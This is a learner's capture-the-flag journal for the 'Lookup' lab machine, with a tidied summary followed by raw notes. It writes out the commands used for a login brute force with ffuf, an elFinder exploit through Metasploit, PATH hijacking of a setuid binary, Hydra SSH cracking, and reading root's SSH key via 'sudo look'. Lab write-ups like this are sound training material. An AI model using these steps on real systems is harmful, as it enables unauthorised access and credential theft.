# Lookup CTF Journal Entry

### Challenge Rating: Easy

**Challenge:**  
Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.  

**Skills:**  
- Web fuzzing with `ffuf`  
- Burp Suite request manipulation (limitations in free edition)  
- Exploit research with `searchsploit` and Metasploit modules  
- Gaining shell access via vulnerable elFinder version (2.1.47)  
- Privilege escalation with PATH poisoning (`/usr/sbin/pwm`)  
- Using Hydra for SSH brute forcing  
- Understanding `$PATH` hijacking mechanics  
- Extracting sensitive files with `sudo look`  
- SSH key abuse for root access  

**Notes:**  
- Target IP: `x.x.x.x`  
- Attempted Burp Suite, but free edition was too slow/limited.  
- Found local Kali wordlists under `/usr/share/wordlists/`.  
- Used `ffuf`:  
  ```bash
  ffuf -c -w /usr/share/wordlists/fasttrack.txt -u http://lookup.thm/login.php \
  -X POST -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'username=admin&password=FUZZ' -fw 8
  ```  
  Broke down flags to understand purpose (`-c` color, `-w` wordlist, `-X POST`, etc.).  

- Discovered elFinder 2.1.47 exploit with `searchsploit`.  
- In Metasploit:  
  - `search elfinder` → found module  
  - Set RHOST and LHOST  
  - Shell established → gained access as `www-data`.  

- Inside `/etc/passwd`, saw user `think` (UID 1000). Shadow file locked.  
- Explored `/usr/sbin/pwm` binary → root-owned, setuid.  
- Learned PATH hijacking:  
  ```bash
  export PATH=/tmp:$PATH
  echo 'echo "uid=1000(think)"' > /tmp/id
  chmod +x /tmp/id
  ```  
  Running `pwm` tricked system → revealed `.passwords`.  

- Used Hydra to crack SSH for `think`:  
  ```bash
  hydra -l think -P think.txt -t 4 ssh://x.x.x.x
  ```  
  Password found: **[redacted]**  

- First flag: `[redacted]`  
- Checked `sudo -lS` → special command `look` available.  
- Used it to dump root SSH key:  
  ```bash
  LFILE=/root/.ssh/id_rsa
  sudo look '' "$LFILE"
  ```  
- Copied key, fixed perms with `chmod 600`, and logged in:  
  ```bash
  ssh -i id_rsa root@<serverIP>
  ```  
- Root flag: `[redacted]`  

**Takeaways:**  
- Metasploit workflow finally clicked.  
- PATH hijacking is now burned into memory — classic Linux PE vector.  
- Need to get a better notepad + package manager for Kali.  
- Next time: explore **LinPEAS** for faster privilege escalation checks.  



---
orginial notes:
<details>
    lookup notes
    ip = [redacted]
    tried a bunch of different things I don't quite udnerstand, and some of the walkthroughs don't help, htey just jump to where they did the sutff. which sucks.
    I tried burp suite, and while I believe it would be easier, it is liminted in it's free edition and slow
    I tried ffuf and found my local word lists in kali linux under the share/wordlist folder
    i tried the commmand ffuf -c -w /usr/share/wordlists/fasttrack.txt -u http://lookup.thm/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'username=admin&password=FUZZ' -fw 8  
    -c to colorize it, -w wordlist, -u target url, -X POST a post request (post is update or change server via http request), -d is to specify which data to http site, so we have the username set to wqual amdin and the password is being fuzzed to find it
    so, since we found the password ot admin is password123 and it doesn't work, that's odd! let's find other usernames
    , my notepadd crashed and I lsot all my notes!
    I learned that bsically all the info in the files seems to be junk, that the elFinder database has an exploit for it's version and that linux as a SEARCH OF EXPLOIT program baked in. searchspoilt...awesome, but before i knew that I went to the exploit finder website, found the explit for elFidner 2.1.47 and downloaded it.
    so a lot of differnet ways to do this, with searchspolit we found it and if we type in msfconsole, we load a program we dan use
    i learned we can use metasplot and use > search and find the program so we look for elfinder with > search elfinder
    we see that there are sever matching modules, lets use 4, which is what we found the otehr way for a php issue
    NOTE TO SELF: take a metasploit class to learn the ends and outs
    we need to set the RHOST, or receving target, in meta splot, so I did RHOST and the ip we have
    we do thisb y doiung set rhosts [redacted]
    then we have to set our pc, lhost to our ip of [redacted]
    trying different files and such, we find the link files.lookup.thm for rhost works when we run it, now where hate metepreter showing
    so we do ls and we're iun!
    NOTE TO SELF: find a better notepad and package manager. Jesus christ these defaults are awful
    did some digging inside the server and we got to the /etc folder, where sys config files and control behavior of the os are stored
    when we copy and look into this folder, we find a passwd file
    looking here we find root and a user name think with a value 1000 meaning an
    we don't know the password for think, but we do know that it's stored in the shadow file, which we can't access. Let's find our next step. Let's look inside thinks folders, maybe the user flag is there or the user left their password on a note


under that file, which we've alreayd looked at, we see a user.txt file but we can't access it yet, there is also a passwords file

I just noticed that php has a shell command, I used shell and now it's more link linux. Awesome. 

I tried to grep for passwords but didn't have permissions

I used find / -perm -4000 2>/dev/null and found a list of files. 

tried su think, to change but the nopassword hint didn't work

Doing some digging and studying, I found that if we use the ID cmd we can see what we can do and also find the path to the id. We look and we see we don't have a password file, maybe we can use $PATH to escalte privlegaes
 
when we use the find / -perm -4000 2>/dev/null command again we see that there is one odd folder, the /usr/sbin/pwm isn't normally there, let's look at it

using ls -la /usr/sbin/pwm we see: -rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm

so root owns it. if we try to execute it with bash it says bash cna't run a binary file, so let's try just using it. we gett a few [!] notes with running 'id' comd to exgtra the username and user ID (UID) nad out ID of www-data and an itneresting not with the [-] the file /home/www-data/ .passwords not found

 this binary seems to execute the “id” command, and then extracts the username out of it, and then puts that username into “/home/<username>/.passwords” and tries to do something with it.

If the “id” command is not specified with it’s full path (/bin/id), it is found and executed via the PATH variable in our environment.

I've used these commands because we see I can copy and we try to do this to make a malicious file

we can use PATH poisioning here. I like that, poison, nice like a diablo 2 necormancer. Anyway, we can find who we are nad the right which "which id" 

This shows the real id command path (usually /usr/bin/id).
Now, manipulate $PATH:

export PATH=/tmp:$PATH
Create a fake id in /tmp:

echo 'echo "uid=1000(think)"' > /tmp/id
chmod +x /tmp/id



PATH hijacking is one of the “usual suspects” you’re trained to look for in Linux PE. (LinPEAS even auto-checks for it.).
lets use linPEAs next time

SIDE NOTE: LEARN about path hijacking in depth nad how it works.

OOOOO! The reason this works is becasue we used the export command to put the PATH link AFTER /tmp:$PATH. This way it checks the tmp first and gives us the rights we want!

running the /usr/sbin/pwm command now, we get a list we can use to ffuf/hyrda to crack into the "think" account!

we used the hydra command to try find which  password would log into think. we use  hydra -l think -P /home/kali/Desktop/think.txt  -t 4 ssh://[redacted]

pw: josemario.AKA(think)

first flag! "[redacted]"

if we do sudo -lS we can see that we have the special command look

we use the look command to find the root ssh security key, we find it under root with:

LFILE=/root/.ssh/id_rsa

sudo look '' "$LFILE"

there we find the id_rsa file, we copy that to our desktop change, chagne hte permissions with chmod 600 "filename"

then we log into the system via root and this key with ssh -i <filename> root@<serverIP>

BANG! We're in! found the root pass 

"[redacted]"


</details>

